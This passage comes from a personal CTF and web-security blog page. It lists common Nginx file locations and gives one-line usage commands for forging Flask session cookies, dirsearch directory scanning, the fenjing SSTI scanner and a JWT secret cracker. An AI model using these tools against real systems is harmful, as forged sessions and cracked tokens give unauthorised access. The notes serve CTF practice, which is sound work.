+<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>其存放重要文件的常见位置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">配置文件存放目录：/etc/nginx</span><br><span class="line">主配置文件：/etc/nginx/conf/nginx.conf</span><br><span class="line">管理脚本：/usr/lib64/systemd/system/nginx.service</span><br><span class="line">模块：/usr/lisb64/nginx/modules</span><br><span class="line">应用程序：/usr/sbin/nginx</span><br><span class="line">程序默认存放位置：/usr/share/nginx/html</span><br><span class="line">日志默认存放位置：/var/log/nginx</span><br><span class="line">配置文件目录为：/usr/local/nginx/conf/nginx.conf 或是： /usr/local/nginx/conf/default.config</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="一些脚本的使用方法"><a href="#一些脚本的使用方法" class="headerlink" title="一些脚本的使用方法"></a>一些脚本的使用方法</h2><h3 id="Session伪造脚本"><a href="#Session伪造脚本" class="headerlink" title="Session伪造脚本"></a>Session伪造脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -s &quot;密钥&quot; -c &quot;session值&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &quot;密钥&quot; -t &quot;session值&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="dirsearch脚本"><a href="#dirsearch脚本" class="headerlink" title="dirsearch脚本"></a>dirsearch脚本</h3><p>使用文件拓展名为php,html,js的字典扫描目标url：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -e php,html,js -u https://target</span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用字典：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u 网址 -w D:\CTF\dicc.txt</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="fenjing脚本"><a href="#fenjing脚本" class="headerlink" title="fenjing脚本"></a>fenjing脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing scan --url http://</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="jwt-cracker"><a href="#jwt-cracker" class="headerlink" title="jwt-cracker"></a>jwt-cracker</h3><p>用虚拟机打开CTF-tools</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./jwtcrack jwt</span><br></pre></td></tr></table></figure>
+
+
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2024/05/07/CTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">CTF刷题笔记</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="https://img2.imgtp.com/2024/05/07/7UohJ0PE.png" class="soft-size--round soft-style--box" alt="xiaofuc">
+    
+    
+      <h2>xiaofuc</h2>
+    
+    
+      <p>WEB安全、CTF</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>2</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        0
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        0
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+    <p>我是 徐bq的爹</p>
+  </div>
+</section>
+
+
+      <section class="widget-categories widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+      <span>CATEGORIES</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categories-list">
+      
+    </ul>
+  </div>
+</section>
+
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      
+    </div>
+  </div>
+</section>
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://github.com/miiiku/" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+        
+          <a href="https://twitter.com/guanquanhong" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-twitter" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M962.285714 233.142857q-38.285714 56-92.571429 95.428571 0.571429 8 0.571429 24 0 74.285714-21.714286 148.285714t-66 142-105.428571 120.285714-147.428571 83.428571-184.571429 31.142857q-154.857143 0-283.428571-82.857143 20 2.285714 44.571429 2.285714 128.571429 0 229.142857-78.857143-60-1.142857-107.428571-36.857143t-65.142857-91.142857q18.857143 2.857143 34.857143 2.857143 24.571429 0 48.571429-6.285714-64-13.142857-106-63.714286t-42-117.428571l0-2.285714q38.857143 21.714286 83.428571 23.428571-37.714286-25.142857-60-65.714286t-22.285714-88q0-50.285714 25.142857-93.142857 69.142857 85.142857 168.285714 136.285714t212.285714 56.857143q-4.571429-21.714286-4.571429-42.285714 0-76.571429 54-130.571429t130.571429-54q80 0 134.857143 58.285714 62.285714-12 117.142857-44.571429-21.142857 65.714286-81.142857 101.714286 53.142857-5.714286 106.285714-28.571429z"></path>
+</svg>
+          </a>
+        
+      
+    </div>
+     
+    <p>&copy; 2024 <a href="/" target="_blank">xiao_fu_c</a></p>
+
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
+
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
+
+
+<!-- copy button  -->
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+<!-- https://clipboardjs.com/ -->
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
+</html>
